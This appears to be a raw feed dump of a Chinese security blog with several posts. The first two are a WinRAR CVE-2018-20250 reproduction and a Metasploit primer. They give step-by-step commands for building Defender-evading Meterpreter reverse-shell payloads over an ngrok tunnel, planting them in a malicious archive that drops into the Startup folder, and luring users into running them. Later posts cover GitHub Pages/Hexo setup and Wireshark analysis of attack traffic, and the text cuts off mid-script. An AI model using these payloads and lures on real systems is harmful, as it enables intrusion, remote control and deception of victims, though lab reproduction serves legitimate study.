href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p><h3 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WinRAR &lt; 5.70 Beta 1</span><br><span class="line">Bandizip &lt; = 6.2.0.0</span><br><span class="line">好压(2345压缩) &lt; = 5.9.8.10907</span><br><span class="line">360压缩 &lt; = 4.0.0.1170</span><br></pre></td></tr></table></figure><h2 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h2><h3 id="1-准备"><a href="#1-准备" class="headerlink" title="1. 准备"></a>1. 准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KaliLinux（2019.1)</span><br><span class="line">Metasploit(KaliLinux2019.1已经集成了Metasploit5)</span><br><span class="line">ngrok</span><br></pre></td></tr></table></figure><h3 id="2-下载EXP"><a href="#2-下载EXP" class="headerlink" title="2. 下载EXP"></a>2. 下载EXP</h3><p><strong>下载WinRAR远程代码执行漏洞EXP利用文件:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/WyAtu/CVE-2018-20250.git</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/1552705180118.png" alt="1552705180118"></p><h3 id="3-开启ngrok"><a href="#3-开启ngrok" class="headerlink" title="3. 开启ngrok"></a>3. 开启ngrok</h3><p>浏览器打开<a href="https://www.ngrok.com/" target="_blank" rel="noopener">https://www.ngrok.com/</a> 进行账号登录，开通一个免费的隧道转发代理。</p><p>按照首页的步骤建立如下连接</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/343244.png" alt></p><h3 id="4-生成Payload"><a href="#4-生成Payload" class="headerlink" title="4. 生成Payload"></a>4. 生成Payload</h3><p>Metasploit生成免杀Payload 载荷(针对Windows10的defender)</p><p>使用Metasploit5自带的免杀模块生成Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use evasion/windows/windows_defender_exe(选择msf5免杀模块)</span><br><span class="line">show info(显示模块信息)</span><br><span class="line">set filename WinRarPayloadTest.exe(设置Payload名字 )</span><br><span class="line">set payload windows/meterpreter/reverse_tcp(设置Payload类型 )</span><br><span class="line">set lhost tcp://0.tcp.ngrok.io(设置上线地址，填写Ngrok映射出去的地址即可)</span><br><span class="line">set lport 17814(设置监听端口，填写Ngrok映射出去的端口即可 )</span><br><span class="line">run(生成Payload)</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sfasfe.png" alt></p><p>把Payload文件放到EXP文件夹下的根目录</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/asd57h.png" alt></p><p>打开exp.py文件把“calc.exe“修改成”WinRarPayload.exe”保存</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sdasdf676.png" alt></p><p>Python运行exp.py文件自动在文件根目录下生成恶意压缩包。</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/Y4HG8TCD3.png" alt></p><p>已经成功生成了恶意的压缩包，这时候可以往里面放一些引诱文件就变成了诱人的压缩包了。</p><p>Windows7靶机下载解压这个恶意压缩包：</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/saass.png" alt></p><p>解压后自动在系统启动目录下自动出现我们之前生成的Payload</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/dfgjhjh456754.png" alt></p><p>Windows7系统启动目录:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>Metasploit启动远程监听主机上线请求:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.10.20</span><br><span class="line">set lport 8878</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/%$V6[`8.png" alt></p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/2B3X4XPAT0W.png" alt></p><p>确保ngrok后台在运行,然后重启Windows7靶机，metasploit监听等待上线</p><h3 id="5-验证payload"><a href="#5-验证payload" class="headerlink" title="5. 验证payload"></a>5. 验证payload</h3><p>待更新</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> WinRAR </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit(MSF)入门</title>
      <link href="/2019/03/14/Metasploit-MSF/"/>
      <url>/2019/03/14/Metasploit-MSF/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Metasploit介绍"><a href="#一、Metasploit介绍" class="headerlink" title="一、Metasploit介绍"></a>一、Metasploit介绍</h2><p>综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。</p><h2 id="二、Metasploit启动"><a href="#二、Metasploit启动" class="headerlink" title="二、Metasploit启动"></a>二、Metasploit启动</h2><p>kali集成了Metasploit框架，依赖于postgresql数据库</p><ol><li><p>先启动数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure></li><li><p>启动MSF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li></ol><h2 id="三、生成木马程序"><a href="#三、生成木马程序" class="headerlink" title="三、生成木马程序"></a>三、生成木马程序</h2><p>利用MSF生成木马获取meterpreter反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br></pre></td></tr></table></figure><a id="more"></a><p>-p  选用什么payload<br>lhost  监听ip<br>lport  监听端口<br>-f  生成文件的类型</p><h2 id="四、投放木马到目标机上"><a href="#四、投放木马到目标机上" class="headerlink" title="四、投放木马到目标机上"></a>四、投放木马到目标机上</h2><h2 id="五、开启监听"><a href="#五、开启监听" class="headerlink" title="五、开启监听"></a>五、开启监听</h2><p>启用MSF，具体操作如下：</p><ol><li><p>加载expuse </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/handler</span><br></pre></td></tr></table></figure></li><li><p>加载payload（要和生成木马选用的payload一致）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></li><li><p>查看哪些参数是需要输入的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show opptions</span><br><span class="line">#设置监听的IP</span><br><span class="line">set lhost 192.168.10.14</span><br><span class="line">#设置监听的端口</span><br><span class="line">set lport 8787</span><br></pre></td></tr></table></figure></li><li><p>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run/exploit</span><br></pre></td></tr></table></figure></li></ol><h2 id="六、进行欺骗"><a href="#六、进行欺骗" class="headerlink" title="六、进行欺骗"></a>六、进行欺骗</h2><ol><li>诱导用户点击我们的木马程序</li><li>等待用户上线，就能得到meterpreter</li></ol><h2 id="七、获得shell"><a href="#七、获得shell" class="headerlink" title="七、获得shell"></a>七、获得shell</h2><ol><li><p>执行shell 进到被攻击者电脑的终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></li><li><p>添加添加用户  开机3389 连接桌面(</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.10.19</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用GitHub Pages搭建个人博客</title>
      <link href="/2019/03/13/%E5%88%A9%E7%94%A8github%20pages+hexo%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/03/13/%E5%88%A9%E7%94%A8github%20pages+hexo%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、创建GitHub-Pages"><a href="#一、创建GitHub-Pages" class="headerlink" title="一、创建GitHub Pages"></a>一、创建GitHub Pages</h2><p>使用GitHub Pages搭建博客的好处有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 全是静态文件，访问速度快；</span><br><span class="line">2. 免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</span><br><span class="line">3. 可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</span><br><span class="line">4. 数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；</span><br><span class="line">5. 博客内容可以轻松打包、转移、发布到其它平台；</span><br><span class="line">6. 等等；</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="1-首先创建存储库"><a href="#1-首先创建存储库" class="headerlink" title="1. 首先创建存储库"></a>1. 首先创建存储库</h3><p>前往<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>并<a href="https://github.com/new" target="_blank" rel="noopener">创建一个</a>名为<em>username</em> .github.io <a href="https://github.com/new" target="_blank" rel="noopener">的新存储库</a>，其中<em>username</em>是GitHub上的用户名（或组织名称）</p><p><img src="/2019/03/13/利用github pages+hexo 搭建个人博客/1552609247373.png" alt="1552609247373"></p><p><strong>注意：如果存储库名字的第一部分与你的用户名不完全匹配，则无法正常工作，因此请务必正确使用。</strong></p><h3 id="2-安装-Git"><a href="#2-安装-Git" class="headerlink" title="2. 安装 Git"></a>2. 安装 Git</h3><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a>.</li><li>Mac：使用 <a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>, <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> ：<code>brew install git</code>;或下载 <a href="http://sourceforge.net/projects/git-osx-installer/" target="_blank" rel="noopener">安装程序</a> 安装。</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code> </li></ul><h3 id="3-配置SSH连接GitHub"><a href="#3-配置SSH连接GitHub" class="headerlink" title="3. 配置SSH连接GitHub"></a>3. 配置SSH连接GitHub</h3><ol><li><p>配置SSH Key</p><ul><li><p>检查本机是否有ssh key设置</p><p>右键打开git bash</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><ul><li>如果没有则提示： No such file or directory，则需要生成ssh密钥</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;github注册邮箱&quot;</span><br></pre></td></tr></table></figure><ul><li><p>然后连续3次回车，最终会生成一个.ssh文件 复制.ssh/id_rsa.pub里内容<br>路径为：C:\Users\Administrator/.ssh (Administrator为你当前登录电脑使用的用户名)</p></li><li><p>打开github - 右上角头像 -Setting - SSH and GPG keys - New SSH key<br>title随便填写，Key内容为.ssh/id_rsa.pub的内容</p><p><img src="/2019/03/13/利用github pages+hexo 搭建个人博客/14398360-5516f5c5666265cd.png" alt="利用github pages+hexo 搭建个人博客"></p></li></ul></li><li><p>配置账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name “your_username”  #设置用户名</span><br><span class="line">git config --global user.email “your_registered_github_Email”  </span><br><span class="line">#设置邮箱地址(建议用注册giuhub的邮箱)</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>测试是否配置成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com       # 邮箱地址不需要改。</span><br></pre></td></tr></table></figure><p>直接回车，最后看到这个就说明大功告成：</p><p><em>Hi username! You’ve successfully authenticated, but GitHub does not provide shell access.</em></p></li></ol><h3 id="4-克隆到本地存储库"><a href="#4-克隆到本地存储库" class="headerlink" title="4. 克隆到本地存储库"></a>4. 克隆到本地存储库</h3><p>转到要存储项目的文件夹，然后克隆新存储库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/用户名/用户名.github.io</span><br></pre></td></tr></table></figure><h3 id="5-创建内容"><a href="#5-创建内容" class="headerlink" title="5. 创建内容"></a>5. 创建内容</h3><p>转入项目文件夹并添加index.html文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd username.github.io</span><br><span class="line">echo“Hello World”&gt;index.html</span><br></pre></td></tr></table></figure><h3 id="6-推送到GitHub"><a href="#6-推送到GitHub" class="headerlink" title="6. 推送到GitHub"></a>6. 推送到GitHub</h3><p>添加，提交和推送你的更改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add --all</span><br><span class="line">git commit -m“初始提交”</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h3 id="7-浏览你的Github-Pages"><a href="#7-浏览你的Github-Pages" class="headerlink" title="7.浏览你的Github Pages"></a>7.浏览你的Github Pages</h3><p>Well done，启动浏览器并转到<a href="https://username.github.io。" target="_blank" rel="noopener">https://username.github.io。</a></p><h2 id="二、使用Hexo博客框架"><a href="#二、使用Hexo博客框架" class="headerlink" title="二、使用Hexo博客框架"></a>二、使用Hexo博客框架</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h3 id="1-安装前提"><a href="#1-安装前提" class="headerlink" title="1. 安装前提"></a>1. 安装前提</h3><ol><li>安装 Hexo 相当简单。然而在安装前，需确保已安装下列应用程序：</li></ol><ul><li><p><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a></p></li><li><p><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></p></li></ul><ol start="2"><li><p>安装 Git，并开启ssh连接</p><p>上文已介绍安装和连接步骤</p></li></ol><ol start="3"><li>安装 Node.js</li></ol><p>安装 Node.js 的最佳方式是使用 <a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">nvm</a>。</p><p>cURL:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>Wget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>安装完成后，重启终端并执行下列命令即可安装 Node.js。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nvm install stable</span><br></pre></td></tr></table></figure><p>或者您也可以下载 <a href="http://nodejs.org/" target="_blank" rel="noopener">安装程序</a> 来安装。</p><blockquote><p>Windows 用户</p><p>对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选<strong>Add to PATH</strong>选项。<br>另外，您也可以使用<strong>Git Bash</strong>，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用<strong>Git Bash</strong>来进行操作。</p></blockquote><h3 id="2-快速部署Hexo"><a href="#2-快速部署Hexo" class="headerlink" title="2. 快速部署Hexo"></a>2. 快速部署Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><p><strong>_config.yml</strong></p><p>网站的配置信息，您可以在此配置大部分的参数。</p><p><strong>package.json</strong></p><p>应用程序信息，新添加的插件内容也会出现在这里面。</p><p><strong>scaffolds</strong></p><p>模版文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p><p>这里放了三个模板文件，分别是新添加博客文章（posts）、新添加博客页（page）和新添加草稿（draft）的目标样式。</p><p><strong>source</strong></p><p>资源文件夹是存放博客内容的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。之后我们通过命令新建tags（标签）还有categories（分类）页后，这里会相应地增加文件夹。</p><p><strong>themes</strong></p><p>主题文件夹。Hexo 会根据主题来生成静态页面。</p><h3 id="3-Hexo命令"><a href="#3-Hexo命令" class="headerlink" title="3. Hexo命令"></a>3. Hexo命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g(generate)#生成静态页面</span><br><span class="line">hexo s(server)#启动服务器，默认4000端口，在本地查看内容</span><br></pre></td></tr></table></figure><h3 id="4-部署到github"><a href="#4-部署到github" class="headerlink" title="4. 部署到github"></a>4. 部署到github</h3><p>修改git/blog/_config.yml配置，找到Deployment部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch] #published</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><p>安装 hexo-deployer-git</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save   #第一次部署需要先安装插件</span><br></pre></td></tr></table></figure><p><strong>部署</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d(deploy) #部署到网站</span><br></pre></td></tr></table></figure><p>接下来可以访问我们的GitHub pages页面，查看效果啦</p><h3 id="5-最后"><a href="#5-最后" class="headerlink" title="5. 最后"></a>5. 最后</h3><p>关于hexo的最新详细配置，可以参考[hexo官方文档]:<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark流量分析(实践)</title>
      <link href="/2019/02/16/Wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90(%E5%AE%9E%E8%B7%B5)/"/>
      <url>/2019/02/16/Wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90(%E5%AE%9E%E8%B7%B5)/</url>
      
        <content type="html"><![CDATA[<h2 id="一、流量包修复"><a href="#一、流量包修复" class="headerlink" title="一、流量包修复"></a>一、流量包修复</h2><p>通过在线pacp包修复工具进行修复：</p><p><a href="http://f00l.de/hacking/pcapfix.php" target="_blank" rel="noopener">http://f00l.de/hacking/pcapfix.php</a></p><h2 id="二、WEB流量包分析"><a href="#二、WEB流量包分析" class="headerlink" title="二、WEB流量包分析"></a>二、WEB流量包分析</h2><p>WEB数据包分析主要包含WEB攻击行为的分析， 典型的WEB攻击行为有：WEB扫描、后台目录爆破、后台账号爆破、WEBSHELL上传、SQL注入等等。</p><h3 id="1-WEB扫描分析"><a href="#1-WEB扫描分析" class="headerlink" title="1. WEB扫描分析"></a>1. WEB扫描分析</h3><p>常见的WEB扫描器有Awvs，Netsparker，Appscan，Webinspect，Rsas（绿盟极光），Nessus，WebReaver，Sqlmap等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;扫描器特征值&quot;</span><br></pre></td></tr></table></figure><p>常见的扫描器特征参考：<a href="https://www.freebuf.com/column/156291.htm" target="_blank" rel="noopener">https://www.freebuf.com/column/156291.htm</a> </p><h3 id="2-后台目录爆破分析"><a href="#2-后台目录爆破分析" class="headerlink" title="2. 后台目录爆破分析"></a>2. 后台目录爆破分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;后台url特征&quot;</span><br></pre></td></tr></table></figure><h3 id="3-后台账号爆破"><a href="#3-后台账号爆破" class="headerlink" title="3. 后台账号爆破"></a>3. 后台账号爆破</h3><p>WEB账号登陆页面通常采用post方法请求，要获取流量包中记录的账号信息可通过wireshark筛选出POST请求和账号中的关键字如‘admin’。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http contains &quot;关键字&quot;</span><br></pre></td></tr></table></figure><h3 id="4-WEBSHELL上传"><a href="#4-WEBSHELL上传" class="headerlink" title="4. WEBSHELL上传"></a>4. WEBSHELL上传</h3><p>Webshell文件上传常采用post方法请求，文件内容常见关键字eval，system，assert。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http contains &quot;关键字&quot;</span><br><span class="line">http contains &quot;base64_decode&quot;#菜刀特征</span><br></pre></td></tr></table></figure><h3 id="5-数据库密码"><a href="#5-数据库密码" class="headerlink" title="5. 数据库密码"></a>5. 数据库密码</h3><p>一般是读config文件查看数据库密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&lt;?php&quot;</span><br></pre></td></tr></table></figure><h3 id="6-数据库中内容"><a href="#6-数据库中内容" class="headerlink" title="6. 数据库中内容"></a>6. 数据库中内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql contains &quot;关键字&quot;</span><br></pre></td></tr></table></figure><h3 id="7-vpn及其ip"><a href="#7-vpn及其ip" class="headerlink" title="7. vpn及其ip"></a>7. vpn及其ip</h3><p>查看TCP流量最多的IP</p><h2 id="三、USB流量包分析"><a href="#三、USB流量包分析" class="headerlink" title="三、USB流量包分析"></a>三、USB流量包分析</h2><p>USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。</p><h3 id="1-键盘流量"><a href="#1-键盘流量" class="headerlink" title="1. 键盘流量"></a>1. 键盘流量</h3><p>USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。其中键盘击键信息集中在第三个字节中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usb.capdata</span><br></pre></td></tr></table></figure><ol><li><p>使用kali linux中的<code>tshark</code> 命令把<code>cap data</code>提取出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure></li><li><p>去除空行</p><p>word里替换 <code>^p^p</code> 为 <code>^p</code>，但是这样显得很不专业，下面是更优雅一点的做法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;/^$/d&quot; usbdata.txt</span><br></pre></td></tr></table></figure></li><li><p>根据<a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html" target="_blank" rel="noopener">《USB键盘协议中键码》</a>中的HID Usage ID将数据还原成键位。</p><p>这里贴下漏斗社区上的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"\n"</span>, <span 